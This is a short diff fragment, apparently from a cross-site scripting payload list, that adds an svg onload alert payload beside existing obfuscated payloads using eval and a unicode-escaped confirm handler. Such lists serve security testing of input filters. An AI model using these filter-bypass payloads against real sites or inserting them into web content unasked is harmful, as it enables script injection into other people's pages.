@@ -15,3 +15,5 @@ d=\"alert('XSS');\\")\";
 eval(a+b+c+d);
 
 <w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+<svg•onload=alert(1)>
+
